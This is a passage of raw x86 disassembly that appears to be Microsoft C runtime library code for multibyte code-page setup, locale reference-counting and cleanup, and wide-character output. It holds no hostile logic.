  404c3b:	ja     0x404c4b
  404c3d:	or     BYTE PTR [esi+ecx*1+0x1d],0x20
  404c42:	mov    dl,cl
  404c44:	sub    dl,0x20
  404c47:	mov    BYTE PTR [eax],dl
  404c49:	jmp    0x404c4e
  404c4b:	mov    BYTE PTR [eax],0x0
  404c4e:	inc    ecx
  404c4f:	cmp    ecx,edi
  404c51:	jb     0x404c15
  404c53:	mov    ecx,DWORD PTR [ebp-0x4]
  404c56:	pop    edi
  404c57:	xor    ecx,ebp
  404c59:	pop    ebx
  404c5a:	call   0x401d11
  404c5f:	leave  
  404c60:	ret    
  404c61:	push   0xc
  404c63:	push   0x40c838
  404c68:	call   0x403b74
  404c6d:	call   0x40386b
  404c72:	mov    edi,eax
  404c74:	mov    eax,ds:0x40ea44
  404c79:	test   DWORD PTR [edi+0x70],eax
  404c7c:	je     0x404c9b
  404c7e:	cmp    DWORD PTR [edi+0x6c],0x0
  404c82:	je     0x404c9b
  404c84:	mov    esi,DWORD PTR [edi+0x68]
  404c87:	test   esi,esi
  404c89:	jne    0x404c93
  404c8b:	push   0x20
  404c8d:	call   0x402937
  404c92:	pop    ecx
  404c93:	mov    eax,esi
  404c95:	call   0x403bb9
  404c9a:	ret    
  404c9b:	push   0xd
  404c9d:	call   0x4066fe
  404ca2:	pop    ecx
  404ca3:	and    DWORD PTR [ebp-0x4],0x0
  404ca7:	mov    esi,DWORD PTR [edi+0x68]
  404caa:	mov    DWORD PTR [ebp-0x1c],esi
  404cad:	cmp    esi,DWORD PTR ds:0x40e948
  404cb3:	je     0x404ceb
  404cb5:	test   esi,esi
  404cb7:	je     0x404cd3
  404cb9:	push   esi
  404cba:	call   DWORD PTR ds:0x40b104
  404cc0:	test   eax,eax
  404cc2:	jne    0x404cd3
  404cc4:	cmp    esi,0x40e520
  404cca:	je     0x404cd3
  404ccc:	push   esi
  404ccd:	call   0x402682
  404cd2:	pop    ecx
  404cd3:	mov    eax,ds:0x40e948
  404cd8:	mov    DWORD PTR [edi+0x68],eax
  404cdb:	mov    esi,DWORD PTR ds:0x40e948
  404ce1:	mov    DWORD PTR [ebp-0x1c],esi
  404ce4:	push   esi
  404ce5:	call   DWORD PTR ds:0x40b0f8
  404ceb:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  404cf2:	call   0x404cfc
  404cf7:	jmp    0x404c87
  404cf9:	mov    esi,DWORD PTR [ebp-0x1c]
  404cfc:	push   0xd
  404cfe:	call   0x406624
  404d03:	pop    ecx
  404d04:	ret    
  404d05:	mov    edi,edi
  404d07:	push   ebp
  404d08:	mov    ebp,esp
  404d0a:	sub    esp,0x10
  404d0d:	push   ebx
  404d0e:	xor    ebx,ebx
  404d10:	push   ebx
  404d11:	lea    ecx,[ebp-0x10]
  404d14:	call   0x402290
  404d19:	mov    DWORD PTR ds:0x40f7bc,ebx
  404d1f:	cmp    esi,0xfffffffe
  404d22:	jne    0x404d42
  404d24:	mov    DWORD PTR ds:0x40f7bc,0x1
  404d2e:	call   DWORD PTR ds:0x40b140
  404d34:	cmp    BYTE PTR [ebp-0x4],bl
  404d37:	je     0x404d7e
  404d39:	mov    ecx,DWORD PTR [ebp-0x8]
  404d3c:	and    DWORD PTR [ecx+0x70],0xfffffffd
  404d40:	jmp    0x404d7e
  404d42:	cmp    esi,0xfffffffd
  404d45:	jne    0x404d59
  404d47:	mov    DWORD PTR ds:0x40f7bc,0x1
  404d51:	call   DWORD PTR ds:0x40b13c
  404d57:	jmp    0x404d34
  404d59:	cmp    esi,0xfffffffc
  404d5c:	jne    0x404d70
  404d5e:	mov    eax,DWORD PTR [ebp-0x10]
  404d61:	mov    eax,DWORD PTR [eax+0x4]
  404d64:	mov    DWORD PTR ds:0x40f7bc,0x1
  404d6e:	jmp    0x404d34
  404d70:	cmp    BYTE PTR [ebp-0x4],bl
  404d73:	je     0x404d7c
  404d75:	mov    eax,DWORD PTR [ebp-0x8]
  404d78:	and    DWORD PTR [eax+0x70],0xfffffffd
  404d7c:	mov    eax,esi
  404d7e:	pop    ebx
  404d7f:	leave  
  404d80:	ret    
  404d81:	mov    edi,edi
  404d83:	push   ebp
  404d84:	mov    ebp,esp
  404d86:	sub    esp,0x20
  404d89:	mov    eax,ds:0x40e004
  404d8e:	xor    eax,ebp
  404d90:	mov    DWORD PTR [ebp-0x4],eax
  404d93:	push   ebx
  404d94:	mov    ebx,DWORD PTR [ebp+0xc]
  404d97:	push   esi
  404d98:	mov    esi,DWORD PTR [ebp+0x8]
  404d9b:	push   edi
  404d9c:	call   0x404d05
  404da1:	mov    edi,eax
  404da3:	xor    esi,esi
  404da5:	mov    DWORD PTR [ebp+0x8],edi
  404da8:	cmp    edi,esi
  404daa:	jne    0x404dba
  404dac:	mov    eax,ebx
  404dae:	call   0x404a6a
  404db3:	xor    eax,eax
  404db5:	jmp    0x404f57
  404dba:	mov    DWORD PTR [ebp-0x1c],esi
  404dbd:	xor    eax,eax
  404dbf:	cmp    DWORD PTR [eax+0x40e950],edi
  404dc5:	je     0x404e5c
  404dcb:	inc    DWORD PTR [ebp-0x1c]
  404dce:	add    eax,0x30
  404dd1:	cmp    eax,0xf0
  404dd6:	jb     0x404dbf
  404dd8:	cmp    edi,0xfde8
  404dde:	je     0x404f54
  404de4:	cmp    edi,0xfde9
  404dea:	je     0x404f54
  404df0:	movzx  eax,di
  404df3:	push   eax
  404df4:	call   DWORD PTR ds:0x40b144
  404dfa:	test   eax,eax
  404dfc:	je     0x404f54
  404e02:	lea    eax,[ebp-0x18]
  404e05:	push   eax
  404e06:	push   edi
  404e07:	call   DWORD PTR ds:0x40b138
  404e0d:	test   eax,eax
  404e0f:	je     0x404f48
  404e15:	push   0x101
  404e1a:	lea    eax,[ebx+0x1c]
  404e1d:	push   esi
  404e1e:	push   eax
  404e1f:	call   0x4058c0
  404e24:	xor    edx,edx
  404e26:	inc    edx
  404e27:	add    esp,0xc
  404e2a:	mov    DWORD PTR [ebx+0x4],edi
  404e2d:	mov    DWORD PTR [ebx+0xc],esi
  404e30:	cmp    DWORD PTR [ebp-0x18],edx
  404e33:	jbe    0x404f31
  404e39:	cmp    BYTE PTR [ebp-0x12],0x0
  404e3d:	je     0x404f12
  404e43:	lea    esi,[ebp-0x11]
  404e46:	mov    cl,BYTE PTR [esi]
  404e48:	test   cl,cl
  404e4a:	je     0x404f12
  404e50:	movzx  eax,BYTE PTR [esi-0x1]
  404e54:	movzx  ecx,cl
  404e57:	jmp    0x404f02
  404e5c:	push   0x101
  404e61:	lea    eax,[ebx+0x1c]
  404e64:	push   esi
  404e65:	push   eax
  404e66:	call   0x4058c0
  404e6b:	mov    ecx,DWORD PTR [ebp-0x1c]
  404e6e:	add    esp,0xc
  404e71:	imul   ecx,ecx,0x30
  404e74:	mov    DWORD PTR [ebp-0x20],esi
  404e77:	lea    esi,[ecx+0x40e960]
  404e7d:	mov    DWORD PTR [ebp-0x1c],esi
  404e80:	jmp    0x404eac
  404e82:	mov    al,BYTE PTR [esi+0x1]
  404e85:	test   al,al
  404e87:	je     0x404eb1
  404e89:	movzx  edi,BYTE PTR [esi]
  404e8c:	movzx  eax,al
  404e8f:	jmp    0x404ea3
  404e91:	mov    eax,DWORD PTR [ebp-0x20]
  404e94:	mov    al,BYTE PTR [eax+0x40e94c]
  404e9a:	or     BYTE PTR [ebx+edi*1+0x1d],al
  404e9e:	movzx  eax,BYTE PTR [esi+0x1]
  404ea2:	inc    edi
  404ea3:	cmp    edi,eax
  404ea5:	jbe    0x404e91
  404ea7:	mov    edi,DWORD PTR [ebp+0x8]
  404eaa:	inc    esi
  404eab:	inc    esi
  404eac:	cmp    BYTE PTR [esi],0x0
  404eaf:	jne    0x404e82
  404eb1:	mov    esi,DWORD PTR [ebp-0x1c]
  404eb4:	inc    DWORD PTR [ebp-0x20]
  404eb7:	add    esi,0x8
  404eba:	cmp    DWORD PTR [ebp-0x20],0x4
  404ebe:	mov    DWORD PTR [ebp-0x1c],esi
  404ec1:	jb     0x404eac
  404ec3:	mov    eax,edi
  404ec5:	mov    DWORD PTR [ebx+0x4],edi
  404ec8:	mov    DWORD PTR [ebx+0x8],0x1
  404ecf:	call   0x404a3b
  404ed4:	push   0x6
  404ed6:	mov    DWORD PTR [ebx+0xc],eax
  404ed9:	lea    eax,[ebx+0x10]
  404edc:	lea    ecx,[ecx+0x40e954]
  404ee2:	pop    edx
  404ee3:	mov    si,WORD PTR [ecx]
  404ee6:	inc    ecx
  404ee7:	mov    WORD PTR [eax],si
  404eea:	inc    ecx
  404eeb:	inc    eax
  404eec:	inc    eax
  404eed:	dec    edx
  404eee:	jne    0x404ee3
  404ef0:	mov    esi,ebx
  404ef2:	call   0x404ace
  404ef7:	jmp    0x404db3
  404efc:	or     BYTE PTR [ebx+eax*1+0x1d],0x4
  404f01:	inc    eax
  404f02:	cmp    eax,ecx
  404f04:	jbe    0x404efc
  404f06:	inc    esi
  404f07:	inc    esi
  404f08:	cmp    BYTE PTR [esi-0x1],0x0
  404f0c:	jne    0x404e46
  404f12:	lea    eax,[ebx+0x1e]
  404f15:	mov    ecx,0xfe
  404f1a:	or     BYTE PTR [eax],0x8
  404f1d:	inc    eax
  404f1e:	dec    ecx
  404f1f:	jne    0x404f1a
  404f21:	mov    eax,DWORD PTR [ebx+0x4]
  404f24:	call   0x404a3b
  404f29:	mov    DWORD PTR [ebx+0xc],eax
  404f2c:	mov    DWORD PTR [ebx+0x8],edx
  404f2f:	jmp    0x404f34
  404f31:	mov    DWORD PTR [ebx+0x8],esi
  404f34:	xor    eax,eax
  404f36:	movzx  ecx,ax
  404f39:	mov    eax,ecx
  404f3b:	shl    ecx,0x10
  404f3e:	or     eax,ecx
  404f40:	lea    edi,[ebx+0x10]
  404f43:	stos   DWORD PTR es:[edi],eax
  404f44:	stos   DWORD PTR es:[edi],eax
  404f45:	stos   DWORD PTR es:[edi],eax
  404f46:	jmp    0x404ef0
  404f48:	cmp    DWORD PTR ds:0x40f7bc,esi
  404f4e:	jne    0x404dac
  404f54:	or     eax,0xffffffff
  404f57:	mov    ecx,DWORD PTR [ebp-0x4]
  404f5a:	pop    edi
  404f5b:	pop    esi
  404f5c:	xor    ecx,ebp
  404f5e:	pop    ebx
  404f5f:	call   0x401d11
  404f64:	leave  
  404f65:	ret    
  404f66:	int3   
  404f67:	int3   
  404f68:	int3   
  404f69:	push   0x14
  404f6b:	push   0x40c858
  404f70:	call   0x403b74
  404f75:	or     DWORD PTR [ebp-0x20],0xffffffff
  404f79:	call   0x40386b
  404f7e:	mov    edi,eax
  404f80:	mov    DWORD PTR [ebp-0x24],edi
  404f83:	call   0x404c61
  404f88:	mov    ebx,DWORD PTR [edi+0x68]
  404f8b:	mov    esi,DWORD PTR [ebp+0x8]
  404f8e:	call   0x404d05
  404f93:	mov    DWORD PTR [ebp+0x8],eax
  404f96:	cmp    eax,DWORD PTR [ebx+0x4]
  404f99:	je     0x4050f6
  404f9f:	push   0x220
  404fa4:	call   0x4027d8
  404fa9:	pop    ecx
  404faa:	mov    ebx,eax
  404fac:	test   ebx,ebx
  404fae:	je     0x4050fa
  404fb4:	mov    ecx,0x88
  404fb9:	mov    esi,DWORD PTR [edi+0x68]
  404fbc:	mov    edi,ebx
  404fbe:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fc0:	and    DWORD PTR [ebx],0x0
  404fc3:	push   ebx
  404fc4:	push   DWORD PTR [ebp+0x8]
  404fc7:	call   0x404d81
  404fcc:	pop    ecx
  404fcd:	pop    ecx
  404fce:	mov    DWORD PTR [ebp-0x20],eax
  404fd1:	test   eax,eax
  404fd3:	jne    0x4050d5
  404fd9:	mov    esi,DWORD PTR [ebp-0x24]
  404fdc:	push   DWORD PTR [esi+0x68]
  404fdf:	call   DWORD PTR ds:0x40b104
  404fe5:	test   eax,eax
  404fe7:	jne    0x404ffa
  404fe9:	mov    eax,DWORD PTR [esi+0x68]
  404fec:	cmp    eax,0x40e520
  404ff1:	je     0x404ffa
  404ff3:	push   eax
  404ff4:	call   0x402682
  404ff9:	pop    ecx
  404ffa:	mov    DWORD PTR [esi+0x68],ebx
  404ffd:	push   ebx
  404ffe:	mov    edi,DWORD PTR ds:0x40b0f8
  405004:	call   edi
  405006:	test   BYTE PTR [esi+0x70],0x2
  40500a:	jne    0x4050fa
  405010:	test   BYTE PTR ds:0x40ea44,0x1
  405017:	jne    0x4050fa
  40501d:	push   0xd
  40501f:	call   0x4066fe
  405024:	pop    ecx
  405025:	and    DWORD PTR [ebp-0x4],0x0
  405029:	mov    eax,DWORD PTR [ebx+0x4]
  40502c:	mov    ds:0x40f7cc,eax
  405031:	mov    eax,DWORD PTR [ebx+0x8]
  405034:	mov    ds:0x40f7d0,eax
  405039:	mov    eax,DWORD PTR [ebx+0xc]
  40503c:	mov    ds:0x40f7d4,eax
  405041:	xor    eax,eax
  405043:	mov    DWORD PTR [ebp-0x1c],eax
  405046:	cmp    eax,0x5
  405049:	jge    0x40505b
  40504b:	mov    cx,WORD PTR [ebx+eax*2+0x10]
  405050:	mov    WORD PTR [eax*2+0x40f7c0],cx
  405058:	inc    eax
  405059:	jmp    0x405043
  40505b:	xor    eax,eax
  40505d:	mov    DWORD PTR [ebp-0x1c],eax
  405060:	cmp    eax,0x101
  405065:	jge    0x405074
  405067:	mov    cl,BYTE PTR [eax+ebx*1+0x1c]
  40506b:	mov    BYTE PTR [eax+0x40e740],cl
  405071:	inc    eax
  405072:	jmp    0x40505d
  405074:	xor    eax,eax
  405076:	mov    DWORD PTR [ebp-0x1c],eax
  405079:	cmp    eax,0x100
  40507e:	jge    0x405090
  405080:	mov    cl,BYTE PTR [eax+ebx*1+0x11d]
  405087:	mov    BYTE PTR [eax+0x40e848],cl
  40508d:	inc    eax
  40508e:	jmp    0x405076
  405090:	push   DWORD PTR ds:0x40e948
  405096:	call   DWORD PTR ds:0x40b104
  40509c:	test   eax,eax
  40509e:	jne    0x4050b3
  4050a0:	mov    eax,ds:0x40e948
  4050a5:	cmp    eax,0x40e520
  4050aa:	je     0x4050b3
  4050ac:	push   eax
  4050ad:	call   0x402682
  4050b2:	pop    ecx
  4050b3:	mov    DWORD PTR ds:0x40e948,ebx
  4050b9:	push   ebx
  4050ba:	call   edi
  4050bc:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4050c3:	call   0x4050ca
  4050c8:	jmp    0x4050fa
  4050ca:	push   0xd
  4050cc:	call   0x406624
  4050d1:	pop    ecx
  4050d2:	ret    
  4050d3:	jmp    0x4050fa
  4050d5:	cmp    eax,0xffffffff
  4050d8:	jne    0x4050fa
  4050da:	cmp    ebx,0x40e520
  4050e0:	je     0x4050e9
  4050e2:	push   ebx
  4050e3:	call   0x402682
  4050e8:	pop    ecx
  4050e9:	call   0x4024b6
  4050ee:	mov    DWORD PTR [eax],0x16
  4050f4:	jmp    0x4050fa
  4050f6:	and    DWORD PTR [ebp-0x20],0x0
  4050fa:	mov    eax,DWORD PTR [ebp-0x20]
  4050fd:	call   0x403bb9
  405102:	ret    
  405103:	cmp    DWORD PTR ds:0x41256c,0x0
  40510a:	jne    0x40511e
  40510c:	push   0xfffffffd
  40510e:	call   0x404f69
  405113:	pop    ecx
  405114:	mov    DWORD PTR ds:0x41256c,0x1
  40511e:	xor    eax,eax
  405120:	ret    
  405121:	mov    edi,edi
  405123:	push   ebp
  405124:	mov    ebp,esp
  405126:	push   ebx
  405127:	push   esi
  405128:	mov    esi,DWORD PTR [ebp+0x8]
  40512b:	mov    eax,DWORD PTR [esi+0xbc]
  405131:	xor    ebx,ebx
  405133:	push   edi
  405134:	cmp    eax,ebx
  405136:	je     0x4051a7
  405138:	cmp    eax,0x40ed68
  40513d:	je     0x4051a7
  40513f:	mov    eax,DWORD PTR [esi+0xb0]
  405145:	cmp    eax,ebx
  405147:	je     0x4051a7
  405149:	cmp    DWORD PTR [eax],ebx
  40514b:	jne    0x4051a7
  40514d:	mov    eax,DWORD PTR [esi+0xb8]
  405153:	cmp    eax,ebx
  405155:	je     0x40516e
  405157:	cmp    DWORD PTR [eax],ebx
  405159:	jne    0x40516e
  40515b:	push   eax
  40515c:	call   0x402682
  405161:	push   DWORD PTR [esi+0xbc]
  405167:	call   0x40924d
  40516c:	pop    ecx
  40516d:	pop    ecx
  40516e:	mov    eax,DWORD PTR [esi+0xb4]
  405174:	cmp    eax,ebx
  405176:	je     0x40518f
  405178:	cmp    DWORD PTR [eax],ebx
  40517a:	jne    0x40518f
  40517c:	push   eax
  40517d:	call   0x402682
  405182:	push   DWORD PTR [esi+0xbc]
  405188:	call   0x409208
  40518d:	pop    ecx
  40518e:	pop    ecx
  40518f:	push   DWORD PTR [esi+0xb0]
  405195:	call   0x402682
  40519a:	push   DWORD PTR [esi+0xbc]
  4051a0:	call   0x402682
  4051a5:	pop    ecx
  4051a6:	pop    ecx
  4051a7:	mov    eax,DWORD PTR [esi+0xc0]
  4051ad:	cmp    eax,ebx
  4051af:	je     0x4051f5
  4051b1:	cmp    DWORD PTR [eax],ebx
  4051b3:	jne    0x4051f5
  4051b5:	mov    eax,DWORD PTR [esi+0xc4]
  4051bb:	sub    eax,0xfe
  4051c0:	push   eax
  4051c1:	call   0x402682
  4051c6:	mov    eax,DWORD PTR [esi+0xcc]
  4051cc:	mov    edi,0x80
  4051d1:	sub    eax,edi
  4051d3:	push   eax
  4051d4:	call   0x402682
  4051d9:	mov    eax,DWORD PTR [esi+0xd0]
  4051df:	sub    eax,edi
  4051e1:	push   eax
  4051e2:	call   0x402682
  4051e7:	push   DWORD PTR [esi+0xc0]
  4051ed:	call   0x402682
  4051f2:	add    esp,0x10
  4051f5:	lea    edi,[esi+0xd4]
  4051fb:	mov    eax,DWORD PTR [edi]
  4051fd:	cmp    eax,0x40eca8
  405202:	je     0x40521b
  405204:	cmp    DWORD PTR [eax+0xb4],ebx
  40520a:	jne    0x40521b
  40520c:	push   eax
  40520d:	call   0x409073
  405212:	push   DWORD PTR [edi]
  405214:	call   0x402682
  405219:	pop    ecx
  40521a:	pop    ecx
  40521b:	lea    edi,[esi+0x50]
  40521e:	mov    DWORD PTR [ebp+0x8],0x6
  405225:	cmp    DWORD PTR [edi-0x8],0x40ea48
  40522c:	je     0x40523f
  40522e:	mov    eax,DWORD PTR [edi]
  405230:	cmp    eax,ebx
  405232:	je     0x40523f
  405234:	cmp    DWORD PTR [eax],ebx
  405236:	jne    0x40523f
  405238:	push   eax
  405239:	call   0x402682
  40523e:	pop    ecx
  40523f:	cmp    DWORD PTR [edi-0x4],ebx
  405242:	je     0x405256
  405244:	mov    eax,DWORD PTR [edi+0x4]
  405247:	cmp    eax,ebx
  405249:	je     0x405256
  40524b:	cmp    DWORD PTR [eax],ebx
  40524d:	jne    0x405256
  40524f:	push   eax
  405250:	call   0x402682
  405255:	pop    ecx
  405256:	add    edi,0x10
  405259:	dec    DWORD PTR [ebp+0x8]
  40525c:	jne    0x405225
  40525e:	push   esi
  40525f:	call   0x402682
  405264:	pop    ecx
  405265:	pop    edi
  405266:	pop    esi
  405267:	pop    ebx
  405268:	pop    ebp
  405269:	ret    
  40526a:	mov    edi,edi
  40526c:	push   ebp
  40526d:	mov    ebp,esp
  40526f:	push   ebx
  405270:	push   esi
  405271:	mov    esi,DWORD PTR ds:0x40b0f8
  405277:	push   edi
  405278:	mov    edi,DWORD PTR [ebp+0x8]
  40527b:	push   edi
  40527c:	call   esi
  40527e:	mov    eax,DWORD PTR [edi+0xb0]
  405284:	test   eax,eax
  405286:	je     0x40528b
  405288:	push   eax
  405289:	call   esi
  40528b:	mov    eax,DWORD PTR [edi+0xb8]
  405291:	test   eax,eax
  405293:	je     0x405298
  405295:	push   eax
  405296:	call   esi
  405298:	mov    eax,DWORD PTR [edi+0xb4]
  40529e:	test   eax,eax
  4052a0:	je     0x4052a5
  4052a2:	push   eax
  4052a3:	call   esi
  4052a5:	mov    eax,DWORD PTR [edi+0xc0]
  4052ab:	test   eax,eax
  4052ad:	je     0x4052b2
  4052af:	push   eax
  4052b0:	call   esi
  4052b2:	lea    ebx,[edi+0x50]
  4052b5:	mov    DWORD PTR [ebp+0x8],0x6
  4052bc:	cmp    DWORD PTR [ebx-0x8],0x40ea48
  4052c3:	je     0x4052ce
  4052c5:	mov    eax,DWORD PTR [ebx]
  4052c7:	test   eax,eax
  4052c9:	je     0x4052ce
  4052cb:	push   eax
  4052cc:	call   esi
  4052ce:	cmp    DWORD PTR [ebx-0x4],0x0
  4052d2:	je     0x4052de
  4052d4:	mov    eax,DWORD PTR [ebx+0x4]
  4052d7:	test   eax,eax
  4052d9:	je     0x4052de
  4052db:	push   eax
  4052dc:	call   esi
  4052de:	add    ebx,0x10
  4052e1:	dec    DWORD PTR [ebp+0x8]
  4052e4:	jne    0x4052bc
  4052e6:	mov    eax,DWORD PTR [edi+0xd4]
  4052ec:	add    eax,0xb4
  4052f1:	push   eax
  4052f2:	call   esi
  4052f4:	pop    edi
  4052f5:	pop    esi
  4052f6:	pop    ebx
  4052f7:	pop    ebp
  4052f8:	ret    
  4052f9:	mov    edi,edi
  4052fb:	push   ebp
  4052fc:	mov    ebp,esp
  4052fe:	push   edi
  4052ff:	mov    edi,DWORD PTR [ebp+0x8]
  405302:	test   edi,edi
  405304:	je     0x40538d
  40530a:	push   ebx
  40530b:	push   esi
  40530c:	mov    esi,DWORD PTR ds:0x40b104
  405312:	push   edi
  405313:	call   esi
  405315:	mov    eax,DWORD PTR [edi+0xb0]
  40531b:	test   eax,eax
  40531d:	je     0x405322
  40531f:	push   eax
  405320:	call   esi
  405322:	mov    eax,DWORD PTR [edi+0xb8]
  405328:	test   eax,eax
  40532a:	je     0x40532f
  40532c:	push   eax
  40532d:	call   esi
  40532f:	mov    eax,DWORD PTR [edi+0xb4]
  405335:	test   eax,eax
  405337:	je     0x40533c
  405339:	push   eax
  40533a:	call   esi
  40533c:	mov    eax,DWORD PTR [edi+0xc0]
  405342:	test   eax,eax
  405344:	je     0x405349
  405346:	push   eax
  405347:	call   esi
  405349:	lea    ebx,[edi+0x50]
  40534c:	mov    DWORD PTR [ebp+0x8],0x6
  405353:	cmp    DWORD PTR [ebx-0x8],0x40ea48
  40535a:	je     0x405365
  40535c:	mov    eax,DWORD PTR [ebx]
  40535e:	test   eax,eax
  405360:	je     0x405365
  405362:	push   eax
  405363:	call   esi
  405365:	cmp    DWORD PTR [ebx-0x4],0x0
  405369:	je     0x405375
  40536b:	mov    eax,DWORD PTR [ebx+0x4]
  40536e:	test   eax,eax
  405370:	je     0x405375
  405372:	push   eax
  405373:	call   esi
  405375:	add    ebx,0x10
  405378:	dec    DWORD PTR [ebp+0x8]
  40537b:	jne    0x405353
  40537d:	mov    eax,DWORD PTR [edi+0xd4]
  405383:	add    eax,0xb4
  405388:	push   eax
  405389:	call   esi
  40538b:	pop    esi
  40538c:	pop    ebx
  40538d:	mov    eax,edi
  40538f:	pop    edi
  405390:	pop    ebp
  405391:	ret    
  405392:	test   edi,edi
  405394:	je     0x4053cd
  405396:	test   eax,eax
  405398:	je     0x4053cd
  40539a:	push   esi
  40539b:	mov    esi,DWORD PTR [eax]
  40539d:	cmp    esi,edi
  40539f:	je     0x4053c9
  4053a1:	push   edi
  4053a2:	mov    DWORD PTR [eax],edi
  4053a4:	call   0x40526a
  4053a9:	pop    ecx
  4053aa:	test   esi,esi
  4053ac:	je     0x4053c9
  4053ae:	push   esi
  4053af:	call   0x4052f9
  4053b4:	cmp    DWORD PTR [esi],0x0
  4053b7:	pop    ecx
  4053b8:	jne    0x4053c9
  4053ba:	cmp    esi,0x40ea50
  4053c0:	je     0x4053c9
  4053c2:	push   esi
  4053c3:	call   0x405121
  4053c8:	pop    ecx
  4053c9:	mov    eax,edi
  4053cb:	pop    esi
  4053cc:	ret    
  4053cd:	xor    eax,eax
  4053cf:	ret    
  4053d0:	push   0xc
  4053d2:	push   0x40c878
  4053d7:	call   0x403b74
  4053dc:	call   0x40386b
  4053e1:	mov    esi,eax
  4053e3:	mov    eax,ds:0x40ea44
  4053e8:	test   DWORD PTR [esi+0x70],eax
  4053eb:	je     0x40540f
  4053ed:	cmp    DWORD PTR [esi+0x6c],0x0
  4053f1:	je     0x40540f
  4053f3:	call   0x40386b
  4053f8:	mov    esi,DWORD PTR [eax+0x6c]
  4053fb:	test   esi,esi
  4053fd:	jne    0x405407
  4053ff:	push   0x20
  405401:	call   0x402937
  405406:	pop    ecx
  405407:	mov    eax,esi
  405409:	call   0x403bb9
  40540e:	ret    
  40540f:	push   0xc
  405411:	call   0x4066fe
  405416:	pop    ecx
  405417:	and    DWORD PTR [ebp-0x4],0x0
  40541b:	lea    eax,[esi+0x6c]
  40541e:	mov    edi,DWORD PTR ds:0x40eb28
  405424:	call   0x405392
  405429:	mov    DWORD PTR [ebp-0x1c],eax
  40542c:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  405433:	call   0x40543a
  405438:	jmp    0x4053fb
  40543a:	push   0xc
  40543c:	call   0x406624
  405441:	pop    ecx
  405442:	mov    esi,DWORD PTR [ebp-0x1c]
  405445:	ret    
  405446:	mov    edi,edi
  405448:	push   ebp
  405449:	mov    ebp,esp
  40544b:	sub    esp,0x10
  40544e:	mov    eax,ds:0x40e004
  405453:	xor    eax,ebp
  405455:	mov    DWORD PTR [ebp-0x4],eax
  405458:	push   ebx
  405459:	push   esi
  40545a:	mov    esi,DWORD PTR [ebp+0xc]
  40545d:	test   BYTE PTR [esi+0xc],0x40
  405461:	push   edi
  405462:	jne    0x40559e
  405468:	push   esi
  405469:	call   0x404a09
  40546e:	pop    ecx
  40546f:	mov    ebx,0x40e250
  405474:	cmp    eax,0xffffffff
  405477:	je     0x4054a7
  405479:	push   esi
  40547a:	call   0x404a09
  40547f:	pop    ecx
  405480:	cmp    eax,0xfffffffe
  405483:	je     0x4054a7
  405485:	push   esi
  405486:	call   0x404a09
  40548b:	sar    eax,0x5
  40548e:	push   esi
  40548f:	lea    edi,[eax*4+0x412460]
  405496:	call   0x404a09
  40549b:	and    eax,0x1f
  40549e:	pop    ecx
  40549f:	shl    eax,0x6
  4054a2:	add    eax,DWORD PTR [edi]
  4054a4:	pop    ecx
  4054a5:	jmp    0x4054a9
  4054a7:	mov    eax,ebx
  4054a9:	mov    al,BYTE PTR [eax+0x24]
  4054ac:	and    al,0x7f
  4054ae:	cmp    al,0x2
  4054b0:	je     0x40559e
  4054b6:	push   esi
  4054b7:	call   0x404a09
  4054bc:	pop    ecx
  4054bd:	cmp    eax,0xffffffff
  4054c0:	je     0x4054f0
  4054c2:	push   esi
  4054c3:	call   0x404a09
  4054c8:	pop    ecx
  4054c9:	cmp    eax,0xfffffffe
  4054cc:	je     0x4054f0
  4054ce:	push   esi
  4054cf:	call   0x404a09
  4054d4:	sar    eax,0x5
  4054d7:	push   esi
  4054d8:	lea    edi,[eax*4+0x412460]
  4054df:	call   0x404a09
  4054e4:	and    eax,0x1f
  4054e7:	pop    ecx
  4054e8:	shl    eax,0x6
  4054eb:	add    eax,DWORD PTR [edi]
  4054ed:	pop    ecx
  4054ee:	jmp    0x4054f2
  4054f0:	mov    eax,ebx
  4054f2:	mov    al,BYTE PTR [eax+0x24]
  4054f5:	and    al,0x7f
  4054f7:	cmp    al,0x1
  4054f9:	je     0x40559e
  4054ff:	push   esi
  405500:	call   0x404a09
  405505:	pop    ecx
  405506:	cmp    eax,0xffffffff
  405509:	je     0x405539
  40550b:	push   esi
  40550c:	call   0x404a09
  405511:	pop    ecx
  405512:	cmp    eax,0xfffffffe
  405515:	je     0x405539
  405517:	push   esi
  405518:	call   0x404a09
  40551d:	sar    eax,0x5
  405520:	push   esi
  405521:	lea    edi,[eax*4+0x412460]
  405528:	call   0x404a09
  40552d:	and    eax,0x1f
  405530:	pop    ecx
  405531:	shl    eax,0x6
  405534:	add    eax,DWORD PTR [edi]
  405536:	pop    ecx
  405537:	jmp    0x40553b
  405539:	mov    eax,ebx
  40553b:	test   BYTE PTR [eax+0x4],0x80
  40553f:	je     0x40559e
  405541:	push   DWORD PTR [ebp+0x8]
  405544:	lea    eax,[ebp-0xc]
  405547:	push   0x5
  405549:	push   eax
  40554a:	lea    eax,[ebp-0x10]
  40554d:	push   eax
  40554e:	call   0x4096e0
  405553:	add    esp,0x10
  405556:	test   eax,eax
  405558:	je     0x405561
  40555a:	mov    eax,0xffff
  40555f:	jmp    0x4055be
  405561:	xor    edi,edi
  405563:	cmp    DWORD PTR [ebp-0x10],edi
  405566:	jle    0x405598
  405568:	dec    DWORD PTR [esi+0x4]
  40556b:	js     0x40557f
  40556d:	mov    eax,DWORD PTR [esi]
  40556f:	mov    cl,BYTE PTR [ebp+edi*1-0xc]
  405573:	mov    BYTE PTR [eax],cl
  405575:	mov    ecx,DWORD PTR [esi]
  405577:	movzx  eax,BYTE PTR [ecx]
  40557a:	inc    ecx
  40557b:	mov    DWORD PTR [esi],ecx
  40557d:	jmp    0x40558d
  40557f:	movsx  eax,BYTE PTR [ebp+edi*1-0xc]
  405584:	push   esi
  405585:	push   eax
  405586:	call   0x40212c
  40558b:	pop    ecx
  40558c:	pop    ecx
  40558d:	cmp    eax,0xffffffff
  405590:	je     0x40555a
  405592:	inc    edi
  405593:	cmp    edi,DWORD PTR [ebp-0x10]
  405596:	jl     0x405568
  405598:	mov    ax,WORD PTR [ebp+0x8]
  40559c:	jmp    0x4055be
  40559e:	add    DWORD PTR [esi+0x4],0xfffffffe
  4055a2:	js     0x4055b1
  4055a4:	mov    ecx,DWORD PTR [esi]
  4055a6:	mov    eax,DWORD PTR [ebp+0x8]
  4055a9:	mov    WORD PTR [ecx],ax
  4055ac:	add    DWORD PTR [esi],0x2
  4055af:	jmp    0x4055be
